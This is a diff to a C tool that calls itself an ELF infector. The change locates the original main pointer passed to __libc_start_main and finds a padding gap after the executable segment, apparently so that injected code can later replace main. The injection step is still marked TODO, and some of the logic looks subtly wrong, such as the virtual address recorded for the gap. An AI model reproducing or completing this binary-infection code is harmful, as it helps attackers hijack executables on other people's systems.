@@ -30,20 +30,37 @@
 #define ELF_PHEAD_VADDR			0x10
 #define ELF_PHEAD_FILESZ		0x20
 #define ELF_PT_LOAD			0x01
+#define ELF_EXEC_FLAGS			0x11
 
 #define START_REXMOV_CODE		((char[]){0x48, 0xc7, 0xc7})
 #define START_REXMOV_LEN		3 
+#define START_REXMOV_ADDRLEN		4
 
 #define START_REXLEA_CODE		((char[]){0x48, 0x8d, 0x3d})
 #define START_REXLEA_LEN		3
+#define START_REXLEA_ADDRLEN		4
 
-// helpful type
+// helpful types
 typedef uint64_t offset_t;
+
+typedef struct main_arg_t {
+	uint8_t* file_ptr;
+	size_t addr_size;
+	uint8_t* rip; // if rip is not null, then it is an absolute address at the file_ptr
+	uint8_t* main_addr;
+} main_arg_t;
+
+typedef struct empty_area_t {
+	uint64_t fileoffset;
+	uint64_t vaddr;
+	uint64_t size;
+} empty_area_t;
 
 // static helper functions
 static void print_usage();
 static int open_and_map(char* fname, uint8_t** data, size_t* len);
-static uint32_t* find_arg_main(uint8_t* elf);
+static int find_arg_main(uint8_t* elf, main_arg_t* res);
+static int find_gap(uint8_t* elf_base, empty_area_t* area);
 
 void print_usage(char* progname) {
 	printf("Usage : %s /path/to/elf /path/to/lib exported_func\n", progname);
@@ -81,7 +98,7 @@ int open_and_map(char* fname, uint8_t** data, size_t* len) {
 	return fd;
 }
 
-uint32_t* find_arg_main(uint8_t* elf_base) {
+int find_arg_main(uint8_t* elf_base, main_arg_t* res) {
 	uint8_t type;
 	offset_t startoff;
 	offset_t section_off;
@@ -92,6 +109,7 @@ uint32_t* find_arg_main(uint8_t* elf_base) {
 	offset_t section_vaddr;
 	offset_t section_size;
 	offset_t text_file_offset = 0;
+	uint32_t main_addr;
 	
 	// first find the _start
 	// 1 == 32, 2 == 64
@@ -99,7 +117,7 @@ uint32_t* find_arg_main(uint8_t* elf_base) {
 
 	if (type == 1) {
 		printf("32 bit elf files unsupported\n");
-		return NULL;
+		return -1;
 	}
 
 	// get the entry pointer (which is an offset to us)
@@ -129,7 +147,7 @@ uint32_t* find_arg_main(uint8_t* elf_base) {
 	if (!text_file_offset) {
 		// we didin't find the section
 		printf("Couldn't find section for _start!\n");
-		return NULL;
+		return -1;
 	}
 
 
@@ -144,27 +162,39 @@ uint32_t* find_arg_main(uint8_t* elf_base) {
 	// or they use a REX.W lea
 	// we really should use a length disassembler
 
-
-	//TODO lea
-	//TODO struct for main stuff to return
-
 	while (1) {
-		if (!memcmp(cursor, START_MOV_CODE, START_MOV_LEN)) {
+		if (!memcmp(cursor, START_REXMOV_CODE, START_REXMOV_LEN)) {
+			// set it up as a MOV
+			cursor += START_REXMOV_LEN;
+			res->file_ptr = cursor;
+			res->addr_size = START_REXMOV_ADDRLEN;
+			res->rip = 0;
+			main_addr = *((uint32_t*)(cursor));
+			res->main_addr = ((uint8_t*)NULL) + main_addr;
+			break;
+		}
+		if (!memcmp(cursor, START_REXLEA_CODE, START_REXLEA_LEN)) {
+			// set it up as a LEA
+			cursor += START_REXLEA_LEN;
+			res->file_ptr = cursor;
+			res->addr_size = START_REXLEA_ADDRLEN;
+			// the next lines are correct, but confusing. need clarification
+			res->rip = (uint8_t*)((uint8_t*)cursor + START_REXLEA_ADDRLEN + section_vaddr - elf_base - text_file_offset);
+			res->main_addr = (uint8_t*)((res->rip) + *((int32_t*)cursor));
 			break;
 		}
 		cursor++;
 		if (cursor >= (elf_base + startoff + section_size)) {
 			// we didn't find it :(
-			return NULL;
+			return -1;
 		}
 	}
 	
-	cursor += START_MOV_LEN;	
 
-	return (uint32_t*)cursor;
+	return 0;
 }
 
-uint8_t* find_gap(uint8_t* elf_base) {
+int find_gap(uint8_t* elf_base, empty_area_t* area) {
 	// go through each program header entry
 	// a section of type PT_LOAD that means it is loaded from the file	
 	// We need to find the executable one
@@ -179,6 +209,10 @@ uint8_t* find_gap(uint8_t* elf_base) {
 	uint32_t pflags;
 	uint64_t poff;
 	uint64_t psz;
+	uint64_t pvaddr;
+
+	uint64_t text_end = 0;
+	uint64_t pad_len = -1;
 
 	phoff = *((offset_t*)(elf_base + ELF_HEAD_PHOFF_OFFSET));
 	phentsize = *((uint16_t*)(elf_base + ELF_HEAD_PHENTSIZE_OFFSET));
@@ -188,23 +222,59 @@ uint8_t* find_gap(uint8_t* elf_base) {
 
 	cursor = elf_base + phoff;
 	for (i = 0; i < phnum; i++, cursor += phentsize) {
-		// print each out
+		ptype = *((uint32_t*)(cursor + ELF_PHEAD_TYPE)); 
+		pflags = *((uint32_t*)(cursor + ELF_PHEAD_PFLAGS)); 
+		poff = *((uint64_t*)(cursor + ELF_PHEAD_FILEOFF)); 
+		psz = *((uint64_t*)(cursor + ELF_PHEAD_FILESZ)); 
+		pvaddr = *((uint64_t*)(cursor + ELF_PHEAD_VADDR));
+		
+		printf("Type %x, flags %x, off %018lx, sz %018lx\n", ptype, pflags, poff, psz);
+
+		if ((pflags & ELF_EXEC_FLAGS) && ptype == ELF_PT_LOAD) {
+			// found our text segment
+			text_end = poff + psz;
+			break;
+		}
+	}
+	
+	// we didn't find a loaded executable seciton
+	if (text_end == 0) {
+		return -1;
+	}
+
+	cursor = elf_base + phoff;
+	for (i = 0; i < phnum; i++, cursor += phentsize) {
 		ptype = *((uint32_t*)(cursor + ELF_PHEAD_TYPE)); 
 		pflags = *((uint32_t*)(cursor + ELF_PHEAD_PFLAGS)); 
 		poff = *((uint64_t*)(cursor + ELF_PHEAD_FILEOFF)); 
 		psz = *((uint64_t*)(cursor + ELF_PHEAD_FILESZ)); 
 		
 		printf("Type %x, flags %x, off %018lx, sz %018lx\n", ptype, pflags, poff, psz);
+
+		if (poff < text_end || ptype != ELF_PT_LOAD) {
+			continue;
+		}
+
+		if ((poff - text_end) < pad_len) {
+			pad_len = poff - text_end;	
+		}
 	}
-	return NULL;
+
+	printf("Padding size = %0lx\n", pad_len);
+
+	area->fileoffset = text_end;
+	area->size = pad_len;
+	area->vaddr = pvaddr;
+
+	return 0;
 }
 
 int do_infect(char* target_path, char* lib_path, char* exported_func) {
 	int tfd;
 	uint8_t* tdata;
 	size_t tdata_len;
-	uint32_t* arg_main;
-	void* o_main;
+	main_arg_t arg_main;
+	empty_area_t pad_area;
 	// open and map target
 	tfd = open_and_map(target_path, &tdata, &tdata_len);
 	if (tfd == -1) {
@@ -214,21 +284,22 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 
 	// find original main
 	// it will be an argument to __libc_start_main
-	arg_main = find_arg_main(tdata);
-	if (arg_main == NULL) {
+	if (find_arg_main(tdata, &arg_main)) {
 		printf("Couldn't find main as an arg\n");
 		close(tfd);
 		return -1;
 	}
-
-	o_main = (void*)(((uint8_t*)NULL) + *arg_main);
-
-	printf("Found main at %p\n", o_main);
+	
+	printf("Found main at %016lx, with rip %016lx\n", (uint64_t)arg_main.main_addr, (uint64_t)arg_main.rip);
 
 	// find area for our new main
-	find_gap(tdata);
-	//TODO
+	if (find_gap(tdata, &pad_area)) {
+		printf("Couldn't find a gap\n");
+		return -1;
+	}
+	printf("foff = %lx, vaddr = %lx, len = %lx\n", pad_area.fileoffset, pad_area.vaddr, pad_area.size);
 
+	// TODO
 	// put in our new main
 
 	// overwrite original main pointer
